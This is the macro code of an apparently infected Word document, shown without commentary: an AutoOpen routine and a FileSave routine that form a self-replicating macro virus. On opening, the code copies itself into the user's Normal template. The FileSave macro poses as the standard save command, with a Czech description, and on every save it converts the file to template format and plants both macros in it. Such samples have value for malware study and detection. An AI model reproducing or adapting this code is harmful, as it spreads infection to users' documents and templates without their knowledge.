   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
     Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
     WordBasic.CurValues.FileSummaryInfo dlg
     WordBasic.MacroCopy dlg.FileName + ":AutoOpen", "normal:AutoOpen"
     WordBasic.MacroCopy dlg.FileName + ":FileSave", "normal:FileSave"
   End Sub

   Attribute VB_Name = "FileSave"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Ulozí aktivní dokument nebo šablonu."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
     Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
     On Error GoTo -1: On Error GoTo ErrorHandler
     WordBasic.FileSave
     WordBasic.CurValues.FileSaveAs dlg
     If dlg.Format = 0 Then
       dlg.Format = 1
       WordBasic.FileSaveAs dlg
       WordBasic.MacroCopy "normal:AutoOpen", dlg.Name + ":AutoOpen"
       WordBasic.MacroCopy "normal:FileSave", dlg.Name + ":FileSave"
     End If
   ErrorHandler:
     Select Case Err.Number
       Case 102    'Input box was canceled
       Case Else   'Any other error condition
     End Select
   End Sub
